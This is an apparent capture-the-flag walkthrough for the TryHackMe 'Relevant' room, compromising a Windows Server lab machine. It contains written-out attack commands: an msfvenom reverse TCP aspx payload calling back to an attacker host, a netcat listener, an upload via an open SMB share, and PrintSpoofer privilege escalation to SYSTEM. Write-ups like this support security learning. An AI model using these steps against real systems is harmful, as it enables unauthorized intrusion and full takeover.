```markdown
# Relevant

#### Room: https://tryhackme.com/room/relevant


This is a simple writeup for the TryHackMe room Relevant.

As always the first thing to do in every CTF is to do enumeration.
NMAP is the best tool to use for service enumeration to find out what is active on the machine.
However NMAP was a little to slow for me since I was using the AttackBox (paid subscription) that THM is offering.
Instead I used https://github.com/dievus/threader3000 which is a great tool to scan ALL the active ports on the machine which after that it will prompt you to do a Service scan on the discovered ports.

To run the python script simply run it and it will prompt you to enter the target IP.

After the scan we can see which ports are active and which services are running.

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-01-02T15:05:50
|_Not valid after:  2021-07-04T15:05:50
|_ssl-date: 2021-01-03T15:54:55+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:A8:D5:1B:3A:D3 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows



Host script results:
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:a8:d5:1b:3a:d3 (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-01-03T07:54:55-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-03 15:54:55
|_  start_date: 2021-01-03 15:05:50

The HTTP, RDP and SMB services seem interesting to check out.

First I run another NMAP scan on the SMB ports using the smb-ls, smb-brute and smb-enum-shares scripts to try and discover more on the SMB ports. 

PORT    STATE    SERVICE      VERSION
139/tcp open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp filtered microsoft-ds
MAC Address: 02:C3:57:90:B7:55 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



Host script results:
| smb-brute: 
|_  guest:<blank> => Valid credentials
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.47.219\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.47.219\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.47.219\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.47.219\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-ls: Volume \\10.10.47.219\nt4wrksv
| SIZE   TIME                 FILENAME
| <DIR>  2020-07-25 16:10:05  .
| <DIR>  2020-07-25 16:10:05  ..
| 98     2020-07-25 16:13:05  passwords.txt

From the scans you can see that we are dealing with a Windows Server 2016 machine.

As you can see there is a share that we can access as a guest (or anonymous) 
'\\10.10.47.219\nt4wrksv'

smb-ls also displays the contents in the shared directory

'passwords.txt'

I accessed the shared directory with smbclient which is default installed on Linux
**smbclient '\\\TARGET-IP\directory'**

I used '**get passwords.txt**' to get the file and read the content.
In the text file there is a username and password stored in base64
[User Passwords - Encoded]
Qm9iIC0gIVBAJCR[REDACTED]==
QmlsbCAtIEp1dzRubmFNNG40Mj[REDACTED]
I used CyberChef to decode the base64 encoded string
https://gchq.github.io/CyberChef/

After decoding the username and password I tried to use it on the open RDP port, however it seem that the username and password are not for RDP.
After that I started a gobuster dir enumeration on port 80 and 49663.
Interestingly on port 80 there was nothing to be found and the same goes for port 49663.
gobuster was giving me timeout errors on port 49663, which meant I there was something wrong with either my method or with gobuster and the machine.
Nonetheless I thought of trying and see if the shared directory in the SMB is accessible on the webservices.
I got a 404 on port 80, however on port 49663, it was just an blank page, which meant we can access it through the web browser.
Navigating to http://target-ip:49663/nt4wrks/passwords.txt I got the same content as on the SMB share.
This means we can use this to our advantage and get a web-shell or a reverse shell.

Now the in the room it is suggested not to use Metasploit, however I will just use MSFVENOM to get a reverse TCP payload.
Created a payload with **msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o shell.aspx LHOST=ATTACKER-IP LPORT=ATTACKER-PORT**
I created an '.aspx' file since the machine runs a IIS server.
After the payload is created I started a simple netcat listener on my machine
'**nc -lvnp PORT**'
And uploaded the payload through the SMB shared directory with
smbclient '\\\TARGET-IP\directory' and then put shell.aspx (please note where you have stored your shell on your local machine)

Then you can trigger the payload either accessing it through the web-browser or with curl.
'http://TARGET-IP:49663/nt4wrksv/shell.aspx'

Once I got the shell I do a simple 'whoami' to see who we run as.
iis apppool\defaultapppool
After that I run 'whoami /priv' to see which privileges I the user has.

##### PRIVILEGES INFORMATION

Privilege Name                              Description                                                         State    
============================= ========================================= ======== 
SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled 
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled 
SeAuditPrivilege              Generate security audits                          Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled  
SeImpersonatePrivilege        Impersonate a client after authentication         Enabled  
SeCreateGlobalPrivilege       Create global objects                             Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set                   	Disabled

As you can see **SeImpersonatePrivilege** is Enabled and a quick search on the internet we can find a few privilege exploits that can be used to exploit it.
https://github.com/itm4n/PrintSpoofer
https://github.com/CCob/SweetPotato
https://github.com/antonioCoco/RogueWinRM (NEEDS WINRM ENABLED)
https://github.com/ohpe/juicy-potato
I'll be using **PrintSpoofer** in this scenario, however the room suggest you try out different ways to exploit the system.
Download the exploit from GitHub (the 64bit since the machine is 64bit) https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0 and simply upload it the same way I uploaded the reverse shell.
After that navigate to where the directory is which is somewhere in **C:\\** and run the exploit.
**PrintSpoofer64.exe -i -c powershell** and with a little bit of magic you get **root** or **SYSTEM**.

Then you can start searching for the flags. The flags are stored in their usual default directories for Windows machines.
**C:\\Users\\**
```

